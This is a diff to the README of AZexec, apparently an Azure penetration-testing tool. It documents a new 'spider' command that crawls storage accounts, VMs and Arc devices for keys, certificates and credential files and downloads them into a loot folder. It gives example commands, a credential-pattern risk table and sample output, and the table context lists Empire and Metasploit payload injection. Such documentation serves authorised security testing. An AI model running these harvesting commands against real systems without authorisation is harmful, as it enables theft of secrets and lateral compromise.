@@ -125,6 +125,9 @@ For penetration testers familiar with NetExec (formerly CrackMapExec), here's ho
 | `nxc smb <target> -M pi -o USER=admin EXEC=cmd` | `.\azx.ps1 exec -VMName "vm" -x "cmd" -ExecMethod pi -TargetUser "admin"` | ✅ Required | **Process injection by user** |
 | `nxc smb <target> -M empire_exec -o LISTENER=http` | `.\azx.ps1 empire-exec -Listener http -EmpireHost host -VMName "vm"` | ✅ Required | **Execute Empire stager** |
 | `nxc smb <target> -M met_inject -o SRVHOST=10.0.0.1 SRVPORT=8080 RAND=abc` | `.\azx.ps1 met-inject -SRVHOST 10.0.0.1 -SRVPORT 8080 -RAND abc -VMName "vm"` | ✅ Required | **Inject Metasploit payload** |
+| `nxc smb <target> --spider` | `.\azx.ps1 spider` | ✅ Required | **Spider Azure Storage** (enumerate blobs/files) |
+| `nxc smb <target> -M spider_plus -o DOWNLOAD_FLAG=True` | `.\azx.ps1 spider -Download -OutputFolder C:\Loot` | ✅ Required | **Spider with downloads** |
+| `nxc smb <target> --spider --pattern txt,doc` | `.\azx.ps1 spider -Pattern "txt,docx,key,pem,pfx,config"` | ✅ Required | **Spider with pattern filter** |
 
 **Key Difference**: NetExec tests null sessions with `nxc smb -u '' -p ''`. AZexec now has a direct equivalent: `.\azx.ps1 guest -Domain target.com -Username user -Password ''` which tests empty/null password authentication. For post-auth enumeration, use **guest user credentials** which provides similar low-privileged access for reconnaissance. See the [Guest User Enumeration](#-guest-user-enumeration---the-azure-null-session) section for details.
 
@@ -1329,6 +1332,169 @@ All ARM commands share a common multi-subscription enumeration pattern:
 - Resource group and location
 - Security risk assessment
 - Detailed security issues list
+
+### Spider: `spider`
+
+The `spider` command is the **Azure equivalent of NetExec's `--spider` and `spider_plus` module**. It supports **three spider modes**:
+
+1. **Azure Storage** (default) - Blob containers & Azure File Shares
+2. **VM Shares** - Spider file systems on Azure VMs via `exec`
+3. **Device Shares** - Spider file systems on Arc/MDE/Intune devices via `exec`
+
+#### Storage Spider (Default)
+
+```powershell
+# Basic enumeration - list all accessible blobs and files
+.\azx.ps1 spider
+
+# Pattern filter - search for sensitive file types
+.\azx.ps1 spider -Pattern "txt,docx,key,pem,pfx,config,xml,json,yml"
+
+# Download matching files
+.\azx.ps1 spider -Pattern "pem,pfx,key" -Download -OutputFolder "C:\Loot"
+
+# Target specific storage account
+.\azx.ps1 spider -StorageAccountTarget "mystorageaccount" -BlobsOnly
+
+# Limit recursion depth and file size
+.\azx.ps1 spider -Download -MaxFileSize 5 -Depth 5
+
+# Export results
+.\azx.ps1 spider -Pattern "config,env" -ExportPath spider-results.json
+```
+
+#### VM Spider (NEW)
+
+Spider file systems on Azure VMs using VM Run Command:
+
+```powershell
+# Spider single VM
+.\azx.ps1 spider -VMName "vm-web-01" -Pattern "key,pem,config"
+
+# Spider all VMs with path filtering
+.\azx.ps1 spider -AllVMs -Pattern "password,credential" -StartPath "C:\Users"
+
+# Spider with exclusions and downloads
+.\azx.ps1 spider -VMName "vm-01" -Download -ExcludePaths "Windows,Program Files"
+
+# Spider all VMs in a resource group
+.\azx.ps1 spider -AllVMs -ResourceGroup "Production-RG" -Pattern "pem,pfx"
+```
+
+#### Device Spider (NEW)
+
+Spider file systems on Arc-enabled devices:
+
+```powershell
+# Spider single Arc device
+.\azx.ps1 spider -DeviceName "arc-server-01" -Pattern "key,pem"
+
+# Spider all Arc devices
+.\azx.ps1 spider -AllDevices -StartPath "/etc" -Pattern "conf,key"
+
+# Spider with downloads
+.\azx.ps1 spider -DeviceName "arc-srv" -Download -MaxFileSize 5
+
+# Combined spidering
+.\azx.ps1 spider -AllVMs -AllDevices -Pattern "pem,pfx"
+```
+
+**Parameters**:
+| Parameter | Default | Description |
+|-----------|---------|-------------|
+| `-Pattern` | (all files) | Comma-separated extensions/keywords to match (e.g., "txt,docx,key,pem") |
+| `-Download` | $false | Enable file downloading |
+| `-MaxFileSize` | 10 | Maximum file size in MB to download |
+| `-OutputFolder` | `.\SpiderLoot` | Download destination folder |
+| `-Depth` | 10 | Maximum recursion depth for directory traversal |
+| `-BlobsOnly` | $false | Only spider blob containers (storage mode) |
+| `-SharesOnly` | $false | Only spider Azure File Shares (storage mode) |
+| `-StorageAccountTarget` | (all) | Target a specific storage account |
+| `-ContainerTarget` | (all) | Target a specific container/share |
+| `-VMName` | - | Target specific VM by name (VM spider) |
+| `-AllVMs` | $false | Spider all VMs in scope (VM spider) |
+| `-DeviceName` | - | Target specific Arc device by name (Device spider) |
+| `-AllDevices` | $false | Spider all Arc devices in scope (Device spider) |
+| `-StartPath` | C:\\ (Win) / / (Linux) | Starting directory for VM/Device spider |
+| `-ExcludePaths` | - | Comma-separated paths to exclude from spider |
+| `-StorageOnly` | $false | Only spider Azure Storage (skip VMs/Devices) |
+| `-VMsOnly` | $false | Only spider VMs |
+| `-DevicesOnly` | $false | Only spider Arc/MDE/Intune devices |
+
+**File Risk Classification**:
+| Risk Level | Color | File Types |
+|------------|-------|------------|
+| **CRITICAL** | Red | `.pem`, `.pfx`, `.p12`, `.key`, `.cer`, `*password*`, `*credential*`, `*secret*`, `.kdbx` |
+| **HIGH** | Yellow | `.config`, `.conf`, `.ini`, `.xml`, `.json`, `.yaml`, `.yml`, `.env`, `*connection*` |
+| **MEDIUM** | Cyan | `.docx`, `.xlsx`, `.pdf`, `.txt`, `.csv`, `.sql`, `.bak`, `.ps1`, `.sh` |
+| **LOW** | Gray | All other files |
+
+**RBAC Requirements**:
+| Spider Mode | Required Permissions |
+|-------------|---------------------|
+| Storage | Reader + Storage Account Key Operator / Storage Blob Data Reader |
+| VM (vmrun) | Reader + Virtual Machine Command Executor OR VM Contributor |
+| Arc | Azure Connected Machine Resource Administrator |
+| MDE | Machine.LiveResponse, Machine.Read.All |
+| Intune | DeviceManagementManagedDevices.PrivilegedOperations.All |
+
+**NetExec Comparison**:
+```
+# NetExec SMB Spider
+nxc smb 192.168.1.0/24 -u user -p pass --spider
+
+# AZexec Azure Storage Spider
+.\azx.ps1 spider
+
+# AZexec VM Spider
+.\azx.ps1 spider -VMName vm-01
+
+# NetExec spider_plus with downloads
+nxc smb IP -M spider_plus -o DOWNLOAD_FLAG=True
+
+# AZexec with downloads (storage)
+.\azx.ps1 spider -Download -OutputFolder C:\Loot
+
+# AZexec with downloads (VM)
+.\azx.ps1 spider -VMName vm-01 -Download -OutputFolder C:\Loot
+```
+
+**Sample Output (Storage Spider)**:
+```
+[*] AZX - Azure Storage Spider
+[*] Pattern Filter: txt,config,pem
+
+[*] STORAGE ACCOUNT: mystorageaccount
+    Resource Group: prod-rg | Public: No
+    [*] Blob Containers: 3
+        Container: config (Public: No)
+        AZR    mystorageaccount     443    /config/app.config              [HIGH] [MATCH] Size: 4.5KB
+        AZR    mystorageaccount     443    /config/creds/service.pem       [CRITICAL] [MATCH] Size: 1.2KB
+    [*] File Shares: 2
+        Share: backups
+        AZR    mystorageaccount     443    /backups/db-backup.sql          [MEDIUM] [MATCH] Size: 45MB
+
+[*] SPIDER SUMMARY
+[*] Storage Accounts: 5 | Containers: 12 | File Shares: 8
+[*] Total Files Scanned: 4,521 | Pattern Matches: 127
+```
+
+**Sample Output (VM Spider)**:
+```
+[*] AZX - VM File System Spider
+[*] Pattern Filter: key,pem,config
+
+[*] VM: vm-web-01
+    Resource Group: prod-rg | OS: Windows
+    [*] Enumerating file system...
+    [+] Found 1,234 files
+    AZR    vm-web-01            VM     C:\Users\admin\.ssh\id_rsa          [CRITICAL] [MATCH] Size: 1.6KB
+    AZR    vm-web-01            VM     C:\inetpub\wwwroot\web.config        [HIGH] [MATCH] Size: 4.2KB
+
+[*] VM SPIDER SUMMARY
+[*] VMs Spidered: 3 | Total Files Scanned: 5,421
+[*] Pattern Matches: 87 | Critical Files: 12
+```
 
 ---
 
